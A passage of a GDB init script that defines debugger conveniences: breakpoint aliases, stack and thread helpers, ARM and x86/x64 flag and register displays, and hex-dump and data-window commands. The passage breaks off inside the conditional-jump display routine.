document contextsize-data
Syntax: contextsize-data NUM
| Set data dump window size to NUM lines.
end


define contextsize-code
    if $argc != 1
        help contextsize-code
    else
        set $CONTEXTSIZE_CODE = $arg0
    end
end
document contextsize-code
Syntax: contextsize-code NUM
| Set code window size to NUM lines.
end


# _____________breakpoint aliases_____________
define bpl
    info breakpoints
end
document bpl
Syntax: bpl
| List all breakpoints.
end


define bp
    if $argc != 1
        help bp
    else
        break $arg0
    end
end
document bp
Syntax: bp LOCATION
| Set breakpoint.
| LOCATION may be a line number, function name, or "*" and an address.
| To break on a symbol you must enclose symbol name inside "".
| Example:
| bp "[NSControl stringValue]"
| Or else you can use directly the break command (break [NSControl stringValue])
end


define bpc
    if $argc != 1
        help bpc
    else
        clear $arg0
    end
end
document bpc
Syntax: bpc LOCATION
| Clear breakpoint.
| LOCATION may be a line number, function name, or "*" and an address.
end


define bpe
    if $argc != 1
        help bpe
    else
        enable $arg0
    end
end
document bpe
Syntax: bpe NUM
| Enable breakpoint with number NUM.
end


define bpd
    if $argc != 1
        help bpd
    else
        disable $arg0
    end
end
document bpd
Syntax: bpd NUM
| Disable breakpoint with number NUM.
end


define bpt
    if $argc != 1
        help bpt
    else
        tbreak $arg0
    end
end
document bpt
Syntax: bpt LOCATION
| Set a temporary breakpoint.
| This breakpoint will be automatically deleted when hit!.
| LOCATION may be a line number, function name, or "*" and an address.
end


define bpm
    if $argc != 1
        help bpm
    else
        awatch $arg0
    end
end
document bpm
Syntax: bpm EXPRESSION
| Set a read/write breakpoint on EXPRESSION, e.g. *address.
end


define bhb
    if $argc != 1
        help bhb
    else
        hb $arg0
    end
end
document bhb
Syntax: bhb LOCATION
| Set hardware assisted breakpoint.
| LOCATION may be a line number, function name, or "*" and an address.
end


define bht
    if $argc != 1
        help bht
    else
        thbreak $arg0
    end
end
document bht
Usage: bht LOCATION
| Set a temporary hardware breakpoint.
| This breakpoint will be automatically deleted when hit!
| LOCATION may be a line number, function name, or "*" and an address.
end


# ______________process information____________
define argv
    show args
end
document argv
Syntax: argv
| Print program arguments.
end


define stack
    if $argc == 0
        info stack
    end
    if $argc == 1
        info stack $arg0
    end
    if $argc > 1
        help stack
    end
end
document stack
Syntax: stack <COUNT>
| Print backtrace of the call stack, or innermost COUNT frames.
end


define frame
    info frame
    info args
    info locals
end
document frame
Syntax: frame
| Print stack frame.
end


define flagsarm
# conditional flags are
# negative/less than (N), bit 31 of CPSR
# zero (Z), bit 30
# Carry/Borrow/Extend (C), bit 29
# Overflow (V), bit 28
    # negative/less than (N), bit 31 of CPSR
    if (($cpsr >> 0x1f) & 1)
        printf "N "
	    set $_n_flag = 1
    else
        printf "n "
	    set $_n_flag = 0
    end
    # zero (Z), bit 30
    if (($cpsr >> 0x1e) & 1)
        printf "Z "
	    set $_z_flag = 1
    else
        printf "z "
	    set $_z_flag = 0
    end
    # Carry/Borrow/Extend (C), bit 29
    if (($cpsr >> 0x1d) & 1)
        printf "C "
    	set $_c_flag = 1
    else
        printf "c "
	    set $_c_flag = 0
    end
    # Overflow (V), bit 28
    if (($cpsr >> 0x1c) & 1)
        printf "V "
        set $_v_flag = 1
    else
        printf "v "
        set $_v_flag = 0
    end
    # Sticky overflow (Q), bit 27
    if (($cpsr >> 0x1b) & 1)
        printf "Q "
        set $_q_flag = 1
    else
        printf "q "
        set $_q_flag = 0
    end
    # Java state bit (J), bit 24
    # When T=1:
    # J = 0 The processor is in Thumb state.
    # J = 1 The processor is in ThumbEE state.
    if (($cpsr >> 0x18) & 1)
        printf "J "
        set $_j_flag = 1
    else
        printf "j "
        set $_j_flag = 0
    end
    # Data endianness bit (E), bit 9
    if (($cpsr >> 9) & 1)
        printf "E "
        set $_e_flag = 1
    else
        printf "e "
        set $_e_flag = 0
    end
    # Imprecise abort disable bit (A), bit 8
    # The A bit is set to 1 automatically. It is used to disable imprecise data aborts.
    # It might not be writable in the Nonsecure state if the AW bit in the SCR register is reset.
    if (($cpsr >> 8) & 1)
        printf "A "
        set $_a_flag = 1
    else
        printf "a "
        set $_a_flag = 0
    end
    # IRQ disable bit (I), bit 7
    # When the I bit is set to 1, IRQ interrupts are disabled.
    if (($cpsr >> 7) & 1)
        printf "I "
        set $_i_flag = 1
    else
        printf "i "
        set $_i_flag = 0
    end
    # FIQ disable bit (F), bit 6
    # When the F bit is set to 1, FIQ interrupts are disabled.
    # FIQ can be nonmaskable in the Nonsecure state if the FW bit in SCR register is reset.
    if (($cpsr >> 6) & 1)
        printf "F "
        set $_f_flag = 1
    else
        printf "f "
        set $_f_flag = 0
    end
    # Thumb state bit (F), bit 5
    # if 1 then the processor is executing in Thumb state or ThumbEE state depending on the J bit
    if (($cpsr >> 5) & 1)
        printf "T "
        set $_t_flag = 1
    else
        printf "t "
        set $_t_flag = 0
    end
    # TODO: GE bit ?
end
document flagsarm
Syntax: flagsarm
| Auxiliary function to set ARM cpu flags.
end


define flagsx86
    # OF (overflow) flag
    if (((unsigned int)$eflags >> 0xB) & 1)
        printf "O "
        set $_of_flag = 1
    else
        printf "o "
        set $_of_flag = 0
    end
    # DF (direction) flag
    if (((unsigned int)$eflags >> 0xA) & 1)
        printf "D "
    else
        printf "d "
    end
    # IF (interrupt enable) flag
    if (((unsigned int)$eflags >> 9) & 1)
        printf "I "
    else
        printf "i "
    end
    # TF (trap) flag
    if (((unsigned int)$eflags >> 8) & 1)
        printf "T "
    else
        printf "t "
    end
    # SF (sign) flag
    if (((unsigned int)$eflags >> 7) & 1)
        printf "S "
        set $_sf_flag = 1
    else
        printf "s "
        set $_sf_flag = 0
    end
    # ZF (zero) flag
    if (((unsigned int)$eflags >> 6) & 1)
        printf "Z "
    	set $_zf_flag = 1
    else
        printf "z "
	    set $_zf_flag = 0
    end
    # AF (adjust) flag
    if (((unsigned int)$eflags >> 4) & 1)
        printf "A "
    else
        printf "a "
    end
    # PF (parity) flag
    if (((unsigned int)$eflags >> 2) & 1)
        printf "P "
	    set $_pf_flag = 1
    else
        printf "p "
    	set $_pf_flag = 0
    end
    # CF (carry) flag
    if ((unsigned int)$eflags & 1)
        printf "C "
	    set $_cf_flag = 1
    else
        printf "c "
    	set $_cf_flag = 0
    end
    printf "\n"
end
document flagsx86
Syntax: flagsx86
| Auxiliary function to set X86/X64 cpu flags.
end


define flags
    # call the auxiliary functions based on target cpu
    if $ARM == 1
        flagsarm
    else
        flagsx86
    end
end
document flags
Syntax: flags
| Print flags register.
end


define eflags
    if $ARM == 1
        # http://www.heyrick.co.uk/armwiki/The_Status_register
        printf "     N <%d>  Z <%d>  C <%d>  V <%d>",\
               (($cpsr >> 0x1f) & 1), (($cpsr >> 0x1e) & 1), \
               (($cpsr >> 0x1d) & 1), (($cpsr >> 0x1c) & 1)
        printf "  Q <%d>  J <%d>  GE <%d>  E <%d>  A <%d>",\
               (($cpsr >> 0x1b) & 1), (($cpsr >> 0x18) & 1),\
               (($cpsr >> 0x10) & 7), (($cpsr >> 9) & 1), (($cpsr >> 8) & 1)
        printf "  I <%d>  F <%d>  T <%d> \n",\
               (($cpsr >> 7) & 1), (($cpsr >> 6) & 1), \
               (($cpsr >> 5) & 1)
     else
        printf "     OF <%d>  DF <%d>  IF <%d>  TF <%d>",\
               (((unsigned int)$eflags >> 0xB) & 1), (((unsigned int)$eflags >> 0xA) & 1), \
               (((unsigned int)$eflags >> 9) & 1), (((unsigned int)$eflags >> 8) & 1)
        printf "  SF <%d>  ZF <%d>  AF <%d>  PF <%d>  CF <%d>\n",\
               (((unsigned int)$eflags >> 7) & 1), (((unsigned int)$eflags >> 6) & 1),\
               (((unsigned int)$eflags >> 4) & 1), (((unsigned int)$eflags >> 2) & 1), ((unsigned int)$eflags & 1)
        printf "     ID <%d>  VIP <%d> VIF <%d> AC <%d>",\
               (((unsigned int)$eflags >> 0x15) & 1), (((unsigned int)$eflags >> 0x14) & 1), \
               (((unsigned int)$eflags >> 0x13) & 1), (((unsigned int)$eflags >> 0x12) & 1)
        printf "  VM <%d>  RF <%d>  NT <%d>  IOPL <%d>\n",\
               (((unsigned int)$eflags >> 0x11) & 1), (((unsigned int)$eflags >> 0x10) & 1),\
               (((unsigned int)$eflags >> 0xE) & 1), (((unsigned int)$eflags >> 0xC) & 3)
     end
end
document eflags
Syntax: eflags
| Print eflags register.
end


define cpsr
	eflags
end
document cpsr
Syntax: cpsr
| Print cpsr register.
end

define regarm
    printf "  "
    # R0
    color $COLOR_REGNAME
    printf "R0:"
    if ($r0 != $oldr0 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X  ", $r0
    # R1
    color $COLOR_REGNAME
    printf "R1:"
    if ($r1 != $oldr1 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X  ", $r1
	# R2
    color $COLOR_REGNAME
    printf "R2:"
    if ($r2 != $oldr2 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X  ", $r2
	# R3
    color $COLOR_REGNAME
    printf "R3:"
    if ($r3 != $oldr3 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X\n", $r3
    printf "  "
	# R4
    color $COLOR_REGNAME
    printf "R4:"
    if ($r4 != $oldr4 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X  ", $r4
    # R5
    color $COLOR_REGNAME
    printf "R5:"
    if ($r5 != $oldr5 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X  ", $r5
	# R6
    color $COLOR_REGNAME
    printf "R6:"
    if ($r6 != $oldr6 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X  ", $r6
	# R7
    color $COLOR_REGNAME
    printf "R7:"
    if ($r7 != $oldr7 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X\n", $r7
    printf "  "
	# R8
    color $COLOR_REGNAME
    printf "R8:"
    if ($r8 != $oldr8 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X  ", $r8
	# R9
    color $COLOR_REGNAME
    printf "R9:"
    if ($r9 != $oldr9 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X  ", $r9
	# R10
    color $COLOR_REGNAME
    printf "R10:"
    if ($r10 != $oldr10 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X  ", $r10
	# R11
    color $COLOR_REGNAME
    printf "R11:"
    if ($r11 != $oldr11 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X ", $r11
    dumpjump
    printf "\n"
    # R12
    color $COLOR_REGNAME
    printf "  R12:"
    if ($r12 != $oldr12 && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X", $r12
    printf "  "
    # SP
    color $COLOR_REGNAME
    printf "SP:"
    if ($sp != $oldsp && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%08X  ", $sp
	# LR
    color $COLOR_REGNAME
    printf "LR:"
    if ($lr != $oldlr && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf "  0x%08X  ", $lr
	# PC
    color $COLOR_REGNAME
    printf "PC:"
    color $COLOR_REGVAL_MODIFIED
    printf "  0x%08X  ", $pc
    color_bold
    color_underline
    color $COLOR_CPUFLAGS
    flags
	color_reset
    printf "\n"
end
document regarm
Syntax: regarm
| Auxiliary function to display ARM registers.
end

define regx64
    # 64bits stuff
    printf "  "
    # RAX
    color $COLOR_REGNAME
    printf "RAX:"
    if ($rax != $oldrax && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $rax
    # RBX
    color $COLOR_REGNAME
    printf "RBX:"
    if ($rbx != $oldrbx && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $rbx
    # RBP
    color $COLOR_REGNAME
    printf "RBP:"
    if ($rbp != $oldrbp && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $rbp
    # RSP
    color $COLOR_REGNAME
    printf "RSP:"
    if ($rsp != $oldrsp && $SHOWREGCHANGES == 1)
        color $COLOR_REGVAL_MODIFIED
    else
        color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $rsp
    color_bold
    color_underline
    color $COLOR_CPUFLAGS
    flags
    color_reset
    printf "  "
    # RDI
    color $COLOR_REGNAME
    printf "RDI:"
    if ($rdi != $oldrdi && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%016lX  ", $rdi
	# RSI
    color $COLOR_REGNAME
   	printf "RSI:"
	if ($rsi != $oldrsi && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%016lX  ", $rsi
	# RDX
    color $COLOR_REGNAME
   	printf "RDX:"
	if ($rdx != $oldrdx && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%016lX  ", $rdx
	# RCX
    color $COLOR_REGNAME
   	printf "RCX:"
	if ($rcx != $oldrcx && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $rcx
    # RIP
    color $COLOR_REGNAME
    printf "RIP:"
    color $COLOR_REGVAL_MODIFIED
    printf " 0x%016lX\n  ", $rip
    # R8
    color $COLOR_REGNAME
   	printf "R8 :"
	if ($r8 != $oldr8 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $r8
    # R9
    color $COLOR_REGNAME
   	printf "R9 :"
    if ($r9 != $oldr9 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $r9
    # R10
    color $COLOR_REGNAME
   	printf "R10:"
    if ($r10 != $oldr10 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $r10
    # R11
   	color $COLOR_REGNAME
    printf "R11:"
	if ($r11 != $oldr11 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $r11
    # R12
    color $COLOR_REGNAME
	printf "R12:"
    if ($r12 != $oldr12 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX\n  ", $r12
    # R13
    color $COLOR_REGNAME
   	printf "R13:"
    if ($r13 != $oldr13 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $r13
    # R14
    color $COLOR_REGNAME
    printf "R14:"
    if ($r14 != $oldr14 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX  ", $r14
    # R15
	color $COLOR_REGNAME
    printf "R15:"
    if ($r15 != $oldr15 && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%016lX\n  ", $r15
  	color $COLOR_REGNAME
    printf "CS:"
    color $COLOR_REGVAL
    printf " %04X  ", $cs
    color $COLOR_REGNAME
    printf "DS:"
    color $COLOR_REGVAL
    printf " %04X  ", $ds
    color $COLOR_REGNAME
    printf "ES:"
    color $COLOR_REGVAL
    printf " %04X  ", $es
    color $COLOR_REGNAME
    printf "FS:"
    color $COLOR_REGVAL
    printf " %04X  ", $fs
    color $COLOR_REGNAME
    printf "GS:"
    color $COLOR_REGVAL
    printf " %04X  ", $gs
    color $COLOR_REGNAME
    printf "SS:"
    color $COLOR_REGVAL
    printf " %04X", $ss
    color_reset
end
document regx64
Syntax: regx64
| Auxiliary function to display X86_64 registers.
end


define regx86
    printf "  "
    # EAX
    color $COLOR_REGNAME
	printf "EAX:"
    if ($eax != $oldeax && $SHOWREGCHANGES == 1)
   	 	color $COLOR_REGVAL_MODIFIED
   	else
   	 	color $COLOR_REGVAL
   	end
   	printf " 0x%08X  ", $eax
   	# EBX
    color $COLOR_REGNAME
   	printf "EBX:"
   	if ($ebx != $oldebx && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
   	else
	    color $COLOR_REGVAL
   	end
   	printf " 0x%08X  ", $ebx
   	# ECX
    color $COLOR_REGNAME
   	printf "ECX:"
   	if ($ecx != $oldecx && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%08X  ", $ecx
	# EDX
	color $COLOR_REGNAME
	printf "EDX:"
	if ($edx != $oldedx && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
        printf " 0x%08X  ", $edx
	color_bold
	color_underline
	color $COLOR_CPUFLAGS
    flags
    color_reset
    printf "  "
    # ESI
	color $COLOR_REGNAME
    printf "ESI:"
    if ($esi != $oldesi && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%08X  ", $esi
	# EDI
	color $COLOR_REGNAME
    printf "EDI:"
	if ($edi != $oldedi && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%08X  ", $edi
	# EBP
	color $COLOR_REGNAME
	printf "EBP:"
	if ($ebp != $oldebp && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
	end
	printf " 0x%08X  ", $ebp
	# ESP
	color $COLOR_REGNAME
    printf "ESP:"
	if ($esp != $oldesp && $SHOWREGCHANGES == 1)
	    color $COLOR_REGVAL_MODIFIED
	else
	    color $COLOR_REGVAL
    end
    printf " 0x%08X  ", $esp
    # EIP
    color $COLOR_REGNAME
    printf "EIP:"
    color $COLOR_REGVAL_MODIFIED
    printf " 0x%08X\n  ", $eip
    color $COLOR_REGNAME
    printf "CS:"
    color $COLOR_REGVAL
    printf " %04X  ", $cs
    color $COLOR_REGNAME
    printf "DS:"
    color $COLOR_REGVAL
    printf " %04X  ", $ds
    color $COLOR_REGNAME
    printf "ES:"
    color $COLOR_REGVAL
    printf " %04X  ", $es
    color $COLOR_REGNAME
    printf "FS:"
    color $COLOR_REGVAL
    printf " %04X  ", $fs
    color $COLOR_REGNAME
    printf "GS:"
    color $COLOR_REGVAL
    printf " %04X  ", $gs
    color $COLOR_REGNAME
    printf "SS:"
    color $COLOR_REGVAL
    printf " %04X", $ss
    color_reset
end
document regx86
Syntax: regx86
| Auxiliary function to display X86 registers.
end


define reg
    if $ARM == 1
        regarm
	    if ($SHOWREGCHANGES == 1)
	        set $oldr0  = $r0
	        set $oldr1  = $r1
	        set $oldr2  = $r2
	        set $oldr3  = $r3
	        set $oldr4  = $r4
	        set $oldr5  = $r5
	        set $oldr6  = $r6
	        set $oldr7  = $r7
	        set $oldr8  = $r8
    		set $oldr9  = $r9
	    	set $oldr10 = $r10
		    set $oldr11 = $r11
			set $oldr12 = $r12
			set $oldsp  = $sp
			set $oldlr  = $lr
	    end
    else
        if ($64BITS == 1)
            regx64
        else
            regx86
        end
        # call smallregisters
	    smallregisters
        # display conditional jump routine
	    if ($64BITS == 1)
    	    printf "\t\t\t\t"
    	end
        dumpjump
        printf "\n"
        if ($SHOWREGCHANGES == 1)
    	    if ($64BITS == 1)
	        	set $oldrax = $rax
			    set $oldrbx = $rbx
    			set $oldrcx = $rcx
	    		set $oldrdx = $rdx
		    	set $oldrsi = $rsi
    			set $oldrdi = $rdi
	    		set $oldrbp = $rbp
		    	set $oldrsp = $rsp
			    set $oldr8  = $r8
    			set $oldr9  = $r9
	    		set $oldr10 = $r10
		    	set $oldr11 = $r11
			    set $oldr12 = $r12
    			set $oldr13 = $r13
	    		set $oldr14 = $r14
		    	set $oldr15 = $r15
    		else
	        	set $oldeax = $eax
		    	set $oldebx = $ebx
			    set $oldecx = $ecx
    			set $oldedx = $edx
	    		set $oldesi = $esi
		    	set $oldedi = $edi
			    set $oldebp = $ebp
			    set $oldesp = $esp
    		end
	    end
    end
end
document reg
Syntax: reg
| Print CPU registers.
end


define smallregisters
    if ($64BITS == 1)
    #64bits stuff
	    # from rax
    	set $eax = $rax & 0xffffffff
    	set $ax  = $rax & 0xffff
    	set $al  = $ax & 0xff
    	set $ah  = $ax >> 8
    	# from rbx
    	set $ebx = $rbx & 0xffffffff
    	set $bx  = $rbx & 0xffff
    	set $bl  = $bx & 0xff
    	set $bh  = $bx >> 8
	    # from rcx
    	set $ecx = $rcx & 0xffffffff
    	set $cx  = $rcx & 0xffff
    	set $cl  = $cx & 0xff
	    set $ch  = $cx >> 8
    	# from rdx
    	set $edx = $rdx & 0xffffffff
    	set $dx  = $rdx & 0xffff
    	set $dl  = $dx & 0xff
    	set $dh  = $dx >> 8
	    # from rsi
    	set $esi = $rsi & 0xffffffff
    	set $si  = $rsi & 0xffff
    	# from rdi
    	set $edi = $rdi & 0xffffffff
    	set $di  = $rdi & 0xffff
    #32 bits stuff
    else
	    # from eax
    	set $ax = $eax & 0xffff
    	set $al = $ax & 0xff
    	set $ah = $ax >> 8
	    # from ebx
    	set $bx = $ebx & 0xffff
    	set $bl = $bx & 0xff
    	set $bh = $bx >> 8
    	# from ecx
    	set $cx = $ecx & 0xffff
    	set $cl = $cx & 0xff
    	set $ch = $cx >> 8
    	# from edx
    	set $dx = $edx & 0xffff
    	set $dl = $dx & 0xff
	    set $dh = $dx >> 8
    	# from esi
    	set $si = $esi & 0xffff
    	# from edi
	    set $di = $edi & 0xffff
     end
end
document smallregisters
Syntax: smallregisters
| Create the 16 and 8 bit cpu registers (gdb doesn't have them by default).
| And 32bits if we are dealing with 64bits binaries.
end


define func
    if $argc == 0
        info functions
    end
    if $argc == 1
        info functions $arg0
    end
    if $argc > 1
        help func
    end
end
document func
Syntax: func <REGEXP>
| Print all function names in target, or those matching REGEXP.
end


define var
    if $argc == 0
        info variables
    end
    if $argc == 1
        info variables $arg0
    end
    if $argc > 1
        help var
    end
end
document var
Syntax: var <REGEXP>
| Print all global and static variable names (symbols), or those matching REGEXP.
end


define lib
    info sharedlibrary
end
document lib
Syntax: lib
| Print shared libraries linked to target.
end


define sig
    if $argc == 0
        info signals
    end
    if $argc == 1
        info signals $arg0
    end
    if $argc > 1
        help sig
    end
end
document sig
Syntax: sig <SIGNAL>
| Print what debugger does when program gets various signals.
| Specify a SIGNAL as argument to print info on that signal only.
end


define threads
    info threads
end
document threads
Syntax: threads
| Print threads in target.
end


define dis
    if $argc == 0
        disassemble
    end
    if $argc == 1
        disassemble $arg0
    end
    if $argc == 2
        disassemble $arg0 $arg1
    end
    if $argc > 2
        help dis
    end
end
document dis
Syntax: dis <ADDR1> <ADDR2>
| Disassemble a specified section of memory.
| Default is to disassemble the function surrounding the PC (program counter) of selected frame.
| With one argument, ADDR1, the function surrounding this address is dumped.
| Two arguments are taken as a range of memory to dump.
end


# __________hex/ascii dump an address_________
define ascii_char
    if $argc != 1
        help ascii_char
    else
        # thanks elaine :)
        set $_c = *(unsigned char *)($arg0)
        if ($_c < 0x20 || $_c > 0x7E)
            printf "."
        else
            printf "%c", $_c
        end
    end
end
document ascii_char
Syntax: ascii_char ADDR
| Print ASCII value of byte at address ADDR.
| Print "." if the value is unprintable.
end


define hex_quad
    if $argc != 1
        help hex_quad
    else
        printf "%02X %02X %02X %02X %02X %02X %02X %02X", \
               *(unsigned char*)($arg0), *(unsigned char*)($arg0 + 1),     \
               *(unsigned char*)($arg0 + 2), *(unsigned char*)($arg0 + 3), \
               *(unsigned char*)($arg0 + 4), *(unsigned char*)($arg0 + 5), \
               *(unsigned char*)($arg0 + 6), *(unsigned char*)($arg0 + 7)
    end
end
document hex_quad
Syntax: hex_quad ADDR
| Print eight hexadecimal bytes starting at address ADDR.
end


define hexdump
    if $argc == 1
        hexdump_aux $arg0
	else
		if $argc == 2
			set $_count = 0
			while ($_count < $arg1)
				set $_i = ($_count * 0x10)
				hexdump_aux $arg0+$_i
				set $_count++
			end
		else
			help hexdump
		end
    end
end
document hexdump
Syntax: hexdump ADDR <NR_LINES>
| Display a 16-byte hex/ASCII dump of memory starting at address ADDR.
| Optional parameter is the number of lines to display if you want more than one.
end


define hexdump_aux
    if $argc != 1
        help hexdump_aux
    else
    	color_bold
        if ($64BITS == 1)
            printf "0x%016lX : ", $arg0
        else
            printf "0x%08X : ", $arg0
        end
        color_reset
        hex_quad $arg0
        color_bold
        printf " - "
        color_reset
        hex_quad $arg0+8
        printf " "
        color_bold
        ascii_char $arg0+0x0
        ascii_char $arg0+0x1
        ascii_char $arg0+0x2
        ascii_char $arg0+0x3
        ascii_char $arg0+0x4
        ascii_char $arg0+0x5
        ascii_char $arg0+0x6
        ascii_char $arg0+0x7
        ascii_char $arg0+0x8
        ascii_char $arg0+0x9
        ascii_char $arg0+0xA
        ascii_char $arg0+0xB
        ascii_char $arg0+0xC
        ascii_char $arg0+0xD
        ascii_char $arg0+0xE
        ascii_char $arg0+0xF
        color_reset
        printf "\n"
    end
end
document hexdump_aux
Syntax: hexdump_aux ADDR
| Display a 16-byte hex/ASCII dump of memory at address ADDR.
end


# _______________data window__________________
define ddump
    if $argc != 1
        help ddump
    else
        color $COLOR_SEPARATOR
        if $ARM == 1
            printf "[0x%08X]", $data_addr
        else
            if ($64BITS == 1)
                printf "[0x%04X:0x%016lX]", $ds, $data_addr
            else
                printf "[0x%04X:0x%08X]", $ds, $data_addr
            end
        end

    	color $COLOR_SEPARATOR
    	printf "------------------------"
        printf "-------------------------------"
        if ($64BITS == 1)
            printf "-------------------------------------"
	    end
	    color_bold
	    color $COLOR_SEPARATOR
	    printf "[data]\n"
        color_reset
        set $_count = 0
        while ($_count < $arg0)
            set $_i = ($_count * 0x10)
            hexdump $data_addr+$_i
            set $_count++
        end
    end
end
document ddump
Syntax: ddump NUM
| Display NUM lines of hexdump for address in $data_addr global variable.
end


define dd
    if $argc != 1
        help dd
    else
        set $data_addr = $arg0
        ddump 0x10
    end
end
document dd
Syntax: dd ADDR
| Display 16 lines of a hex dump of address starting at ADDR.
end


define datawin
    if $ARM == 1
        if ((($r0 >> 0x18) == 0x40) || (($r0 >> 0x18) == 0x08) || (($r0 >> 0x18) == 0xBF))
            set $data_addr = $r0
        else
            if ((($r1 >> 0x18) == 0x40) || (($r1 >> 0x18) == 0x08) || (($r1 >> 0x18) == 0xBF))
                set $data_addr = $r1
            else
                if ((($r2 >> 0x18) == 0x40) || (($r2 >> 0x18) == 0x08) || (($r2 >> 0x18) == 0xBF))
                    set $data_addr = $r2
                else
                    set $data_addr = $sp
                end
            end
        end
################################# X86
    else
        if ($64BITS == 1)
            if ((($rsi >> 0x18) == 0x40) || (($rsi >> 0x18) == 0x08) || (($rsi >> 0x18) == 0xBF))
                set $data_addr = $rsi
            else
                if ((($rdi >> 0x18) == 0x40) || (($rdi >> 0x18) == 0x08) || (($rdi >> 0x18) == 0xBF))
                    set $data_addr = $rdi
                else
                    if ((($rax >> 0x18) == 0x40) || (($rax >> 0x18) == 0x08) || (($rax >> 0x18) == 0xBF))
                        set $data_addr = $rax
                    else
                        set $data_addr = $rsp
                    end
                end
            end
        else
            if ((($esi >> 0x18) == 0x40) || (($esi >> 0x18) == 0x08) || (($esi >> 0x18) == 0xBF))
                set $data_addr = $esi
            else
                if ((($edi >> 0x18) == 0x40) || (($edi >> 0x18) == 0x08) || (($edi >> 0x18) == 0xBF))
                    set $data_addr = $edi
                else
                    if ((($eax >> 0x18) == 0x40) || (($eax >> 0x18) == 0x08) || (($eax >> 0x18) == 0xBF))
                        set $data_addr = $eax
                    else
                        set $data_addr = $esp
                    end
                end
            end
        end
    end
    ddump $CONTEXTSIZE_DATA
end
document datawin
Syntax: datawin
| Display valid address from one register in data window.
| Registers to choose are: esi, edi, eax, or esp.
end


################################
##### ALERT ALERT ALERT ########
################################
# Huge mess going here :) HAHA #
################################
define dumpjump
    if $ARM == 1
        ## Most ARM and Thumb instructions are conditional!
        # each instruction is 32 bits long
        # 4 bits are for condition codes (16 in total) (bits 31:28 in ARM contain the condition or 1111 if instruction is unconditional)
        # 2x4 bits for destination and first operand registers
        # one for the set-status flag
        # an assorted number for other stuff
        # 12 bits for any immediate value
        # $_t_flag == 0 => ARM mode
